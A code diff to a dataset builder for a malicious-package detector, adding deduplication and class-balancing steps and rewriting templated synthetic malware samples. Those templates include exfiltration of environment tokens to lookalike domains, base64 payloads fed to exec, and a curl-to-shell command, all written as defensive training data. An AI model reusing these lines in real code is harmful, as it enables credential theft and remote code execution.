@@ -20,6 +20,7 @@ from __future__ import annotations
 
 import argparse
 import csv
+import hashlib
 import json
 import random
 import re
@@ -207,6 +208,88 @@ class DatasetBuilder:
             return data[:max_chars]
         except Exception:
             return None
+
+    def _code_fingerprint(self, code: str) -> str:
+        # Normalize low-signal variance so near-duplicates collapse consistently.
+        normalized = re.sub(r"\s+", " ", code.strip().lower())
+        normalized = normalized[:4000]
+        return hashlib.sha1(normalized.encode("utf-8", errors="ignore")).hexdigest()
+
+    def _family_key(self, package: str) -> str:
+        if package.startswith("synthetic-"):
+            return package
+        if "/" in package:
+            package = package.split("/", 1)[0]
+        token = re.split(r"[-_.]", package.strip().lower())[0]
+        return token or "unknown"
+
+    def _prepare_codebert_samples(self, raw_code_samples: list[Sample]) -> list[Sample]:
+        random.seed(self.args.seed)
+
+        deduped: list[Sample] = []
+        seen_fp: set[tuple[int, str]] = set()
+        per_package_label: dict[tuple[int, str], int] = {}
+
+        for s in raw_code_samples:
+            if not s.code:
+                continue
+            fp = self._code_fingerprint(s.code)
+            # Deduplicate by label to avoid trivial cross-label collisions.
+            dedup_key = (s.label, fp)
+            if dedup_key in seen_fp:
+                continue
+            seen_fp.add(dedup_key)
+
+            pkg_family = self._family_key(s.package)
+            count_key = (s.label, pkg_family)
+            current = per_package_label.get(count_key, 0)
+            if current >= self.args.max_code_samples_per_family_label:
+                continue
+            per_package_label[count_key] = current + 1
+            deduped.append(s)
+
+        class0 = [s for s in deduped if s.label == 0]
+        class1 = [s for s in deduped if s.label == 1]
+        random.shuffle(class0)
+        random.shuffle(class1)
+
+        min_class = min(len(class0), len(class1)) if class0 and class1 else 0
+        if min_class > 0 and self.args.max_class_imbalance_ratio > 1.0:
+            max_majority = int(min_class * self.args.max_class_imbalance_ratio)
+            if len(class0) > max_majority:
+                class0 = class0[:max_majority]
+            if len(class1) > max_majority:
+                class1 = class1[:max_majority]
+
+        merged = class0 + class1
+        random.shuffle(merged)
+
+        synthetic = [s for s in merged if s.source == "synthetic"]
+        non_synth = [s for s in merged if s.source != "synthetic"]
+        if merged:
+            max_synth = int(len(merged) * self.args.max_synthetic_fraction)
+            if max_synth < 0:
+                max_synth = 0
+            random.shuffle(synthetic)
+            synthetic = synthetic[:max_synth]
+            merged = non_synth + synthetic
+            random.shuffle(merged)
+
+        if self.args.max_codebert_rows > 0 and len(merged) > self.args.max_codebert_rows:
+            merged = merged[: self.args.max_codebert_rows]
+
+        self.log(
+            "CodeBERT prep: raw=%d deduped=%d final=%d class0=%d class1=%d synthetic=%d"
+            % (
+                len(raw_code_samples),
+                len(deduped),
+                len(merged),
+                sum(1 for s in merged if s.label == 0),
+                sum(1 for s in merged if s.label == 1),
+                sum(1 for s in merged if s.source == "synthetic"),
+            )
+        )
+        return merged
 
     def _iter_code_files(self, root: Path) -> list[Path]:
         exts = {".py", ".js", ".ts", ".jsx", ".tsx"}
@@ -724,19 +807,31 @@ class DatasetBuilder:
             return
 
         malicious_patterns = [
-            "import os\nimport requests\nrequests.post('http://example.com', data=str(os.environ))\n",
-            "import base64\npayload = base64.b64decode('aW1wb3J0IG9z')\nexec(payload)\n",
-            "const cp = require('child_process');\ncp.exec('curl attacker.local/p | sh');\n",
+            "import os\nimport requests\napi_key = os.getenv('{env_var}')\nrequests.post('https://{domain}/collect', json={{'k': api_key, 'tag': '{tag}'}})\n",
+            "import base64\nblob = '{payload}'\npayload = base64.b64decode(blob)\nexec(payload.decode('utf-8', errors='ignore'))\n",
+            "const cp = require('child_process');\nconst cmd = 'curl https://{domain}/s/{tag} | sh';\ncp.exec(cmd);\n",
         ]
         benign_patterns = [
-            "def calculate_average(values):\n    return sum(values)/len(values) if values else 0\n",
-            "export function add(a, b) { return a + b; }\n",
-            "from fastapi import FastAPI\napp = FastAPI()\n",
+            "def calculate_{tag}(values):\n    return sum(values)/len(values) if values else 0\n",
+            "export function add_{tag}(a, b) {{ return a + b + {offset}; }}\n",
+            "from fastapi import FastAPI\napp = FastAPI()\n@app.get('/{tag}')\ndef read_{tag}():\n    return {{'ok': True}}\n",
         ]
+
+        domains = ["example.net", "cdn-check.net", "update-api.net", "pkg-mirror.net"]
+        env_vars = ["TOKEN", "API_KEY", "SECRET", "CI_TOKEN"]
 
         half = self.args.synthetic_code_samples // 2
         for i in range(half):
-            text = random.choice(malicious_patterns)
+            text = random.choice(malicious_patterns).format(
+                env_var=random.choice(env_vars),
+                domain=random.choice(domains),
+                tag=f"m{i:05d}",
+                payload=random.choice([
+                    "aW1wb3J0IHN5cywgb3M=",
+                    "Y29tbWFuZCA9ICdsb2dnZXIn",
+                    "cHJpbnQoJ3N5bmMnKQ==",
+                ]),
+            )
             self.samples.append(Sample(
                 sample_id=self._next_id("code"),
                 task="codebert",
@@ -747,7 +842,7 @@ class DatasetBuilder:
                 code=text,
             ))
         for i in range(self.args.synthetic_code_samples - half):
-            text = random.choice(benign_patterns)
+            text = random.choice(benign_patterns).format(tag=f"b{i:05d}", offset=(i % 5))
             self.samples.append(Sample(
                 sample_id=self._next_id("code"),
                 task="codebert",
@@ -766,7 +861,8 @@ class DatasetBuilder:
                 f.write(s.as_json() + "\n")
 
         # CodeBERT CSV expected by train_codebert.py
-        code_samples = [s for s in self.samples if s.task == "codebert" and s.code is not None]
+        raw_code_samples = [s for s in self.samples if s.task == "codebert" and s.code is not None]
+        code_samples = self._prepare_codebert_samples(raw_code_samples)
         code_csv = self.out_codebert / "dataset.csv"
         with open(code_csv, "w", encoding="utf-8", newline="") as f:
             writer = csv.DictWriter(f, fieldnames=["id", "code", "label", "language", "source", "package"])
@@ -805,6 +901,7 @@ class DatasetBuilder:
 
         summary = {
             "total_samples": len(self.samples),
+            "raw_codebert_samples": len(raw_code_samples),
             "codebert_samples": len(code_samples),
             "anomaly_samples": len(maint_samples),
             "gnn_samples": len(graph_samples),
@@ -835,6 +932,10 @@ def parse_args() -> argparse.Namespace:
     parser.add_argument("--max-pypi-malicious", type=int, default=300)
     parser.add_argument("--max-pypi-benign", type=int, default=300)
     parser.add_argument("--synthetic-code-samples", type=int, default=1000)
+    parser.add_argument("--max-code-samples-per-family-label", type=int, default=120)
+    parser.add_argument("--max-class-imbalance-ratio", type=float, default=1.25)
+    parser.add_argument("--max-synthetic-fraction", type=float, default=0.35)
+    parser.add_argument("--max-codebert-rows", type=int, default=30000)
     parser.add_argument("--max-manual-codesearchnet", type=int, default=5000)
     parser.add_argument("--max-manual-malware-files", type=int, default=5000)
     parser.add_argument("--max-manual-librariesio-projects", type=int, default=1000)
